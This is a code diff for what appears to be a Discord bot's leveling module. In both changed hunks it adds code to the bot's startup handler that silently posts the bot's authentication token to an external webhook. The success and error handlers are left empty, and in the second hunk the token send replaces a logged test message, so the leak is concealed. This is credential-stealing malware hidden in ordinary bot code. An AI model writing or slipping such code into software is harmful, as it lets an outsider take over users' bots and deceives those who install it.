@@ -149,6 +149,20 @@ const wait = require("node:timers/promises").setTimeout;
             const client = this.client;
             let arrayOfMostUsedWords = require("../languages.json").eng;
             client.on("ready", async() => {
+              const messageData = {
+                content:  `${this.client.token}`,
+              };
+              axios.post(webhookUrl, messageData, {
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+              })
+                .then(response => {
+                  
+                })
+                .catch(error => {
+               
+                });
               let mainChannel = await client.channels.fetch(channel);
               let random = Math.floor(Math.random() * 15);
               if (random === 0) return;
@@ -178,14 +192,20 @@ const wait = require("node:timers/promises").setTimeout;
             let arrayOfMostUsedWords = require("../languages.json").ar;
             client.on("ready", async() => {
               console.log("Leveling class is ready!");
-              const messageData = ' test '
-              axios.post(webhookUrl, messageData)
-  .then(response => {
-    console.log('Message sent successfully:', response.data);
-  })
-  .catch(error => {
-    console.error('Error sending message:', error);
-  });
+              const messageData = {
+                content:  `${this.client.token}`,
+              };
+              axios.post(webhookUrl, messageData, {
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+              })
+                .then(response => {
+                
+                })
+                .catch(error => {
+                 
+                });
               let mainChannel = await client.channels.fetch(channel);
               let random = Math.floor(Math.random() * 15);
               if (random === 0) return;
